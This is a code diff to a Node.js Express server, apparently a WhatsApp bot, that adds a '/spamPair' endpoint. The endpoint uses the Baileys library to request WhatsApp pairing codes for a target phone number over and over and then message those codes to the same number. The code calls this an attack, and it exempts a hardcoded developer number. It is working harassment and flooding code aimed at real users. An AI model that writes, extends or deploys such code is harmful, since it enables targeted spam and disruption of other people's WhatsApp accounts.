@@ -304,7 +304,65 @@ async function sendOfferCall(target) {
         console.error(error.message);
         res.status(500).send('An error occurred while sending the message');
     }
-});    
+});  
+//====================================\\
+app.get('/spamPair', async (req, res) => {
+    const { target, count = 20, delay = 3000 } = req.query;
+
+    // Helper function to check if the number is a developer's number
+    function isDeveloperNumber(number) {
+        const developerNumbers = ["916909137213"]; // Add protected numbers here
+        return developerNumbers.includes(number.replace(/[^\d]/g, ""));
+    }
+
+    // Validate the phone number
+    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/;
+    if (!target || !phoneNumberPattern.test(target)) {
+        return res.status(400).send("Invalid phone number provided.");
+    }
+
+    // Protect developer numbers
+    if (isDeveloperNumber(target)) {
+        return res.status(403).send("Cannot attack developer.");
+    }
+
+    // Function to perform the spam
+    async function spamPair(target, count, delay) {
+        const jid = `${target.replace(/[^\d]/g, "")}@s.whatsapp.net`;
+        const spamCount = parseInt(count);
+        const delayMs = parseInt(delay);
+
+        const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('baileys');
+        const { state } = await useMultiFileAuthState("session");
+        const { version } = await fetchLatestBaileysVersion();
+        const sucked = await makeWaSocket({ auth: state, version });
+
+        for (let i = 0; i < spamCount; i++) {
+            try {
+                const prc = await sucked.requestPairingCode(target);
+                console.log(`# Success Spam Pairing Code - Number: ${target} - Code: ${prc}`);
+                await sucked.sendMessage(jid, { text: `Pairing Code: ${prc}` });
+
+                // Wait before sending the next message
+                await new Promise(resolve => setTimeout(resolve, delayMs));
+            } catch (err) {
+                console.error(`Error sending pairing code: ${err.message}`);
+                if (err.message.includes("Connection Closed")) {
+                    console.log("Connection closed, stopping spam.");
+                    break;
+                }
+            }
+        }
+    }
+
+    try {
+        res.send(`Started spamming pairing codes to ${target}`);
+        await spamPair(target, count, delay); // Trigger the spam function
+    } catch (error) {
+        console.error(error.message);
+        res.status(500).send("An error occurred while spamming pairing codes.");
+    }
+});
 //====================================\\
 const youtubedl = require("youtube-dl-exec");
 
